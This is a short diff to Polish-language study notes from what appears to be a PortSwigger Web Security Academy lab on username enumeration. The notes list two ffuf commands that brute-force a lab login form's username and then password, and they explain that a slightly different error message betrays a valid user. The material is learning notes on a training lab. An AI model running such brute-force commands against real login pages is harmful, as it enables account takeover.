@@ -3,7 +3,7 @@
 ffuf -u https://0ae5005d04cdafebc026f24f00c40061.web-security-academy.net/login -d "username=FUZZ&password=asdf" -w username -fs 3096
 ffuf -u https://0ae5005d04cdafebc026f24f00c40061.web-security-academy.net/login -d "username=athena&password=FUZZ" -w passwords
 
-2. Moze byc tak ze panel zwraca ogolna informacje o logowanu np. ze sie nie udalo, ale dla poprawnego uzytkownika pojawia sie np. kropka
+2. Moze byc tak ze panel zwraca ogolna informacje o logowanu np. ze sie nie udalo, ale dla poprawnego uzytkownika a zlego hasla pojawia sie np. kropka
 Nie udalo sie
 Nie udalo sie.
 No i mozemy enumerowac uzytkownikow.
